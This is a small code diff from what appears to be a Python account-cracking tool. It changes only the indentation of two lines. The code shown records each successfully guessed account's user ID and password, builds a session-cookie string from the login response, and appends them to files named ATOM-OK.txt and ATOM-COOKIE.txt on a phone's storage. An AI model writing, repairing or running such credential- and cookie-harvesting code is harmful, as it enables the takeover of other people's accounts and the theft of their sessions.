@@ -419,8 +419,8 @@ def _M2_(ids,pasx):
                                 uid = BLACK["uid"]
                                 print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
                                 coki = ";".join(i["name"]+"="+i["value"] for i in url1["session_cookies"])
-				print("Cookie: "+coki)
-				open('/sdcard/ATOM-COOKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
+                                print("Cookie: "+coki)
+                                open('/sdcard/ATOM-COOKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                                 open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'\n')
                                 ok.append(uid)
                                 break
